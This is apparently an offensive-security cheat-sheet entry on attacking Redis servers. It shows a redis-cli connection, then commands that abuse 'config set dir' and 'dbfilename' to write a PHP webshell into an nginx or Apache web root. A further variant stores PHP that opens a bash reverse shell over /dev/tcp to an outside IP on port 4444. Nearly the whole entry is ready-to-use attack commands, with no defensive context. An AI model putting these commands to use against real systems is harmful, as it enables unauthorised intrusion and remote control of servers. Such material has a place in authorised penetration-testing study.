---
title: Redis Enumeration
category: recon
subcategory: service-enum
os: linux
command: redis-cli -h target
tools: redis-cli
---


### Connection

```bash
redis-cli -h 10.85.21.241
```

### Webshell upload via config

```bash
config set dir /usr/share/nginx/html
# or
config set dir /var/www/html
config set dbfilename redis.php
set test "<?php phpinfo(); ?>"
save
```

### Reverse shell variant

```bash
set test "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.10.84.215/4444 0>&1'\"); ?>"
save
```
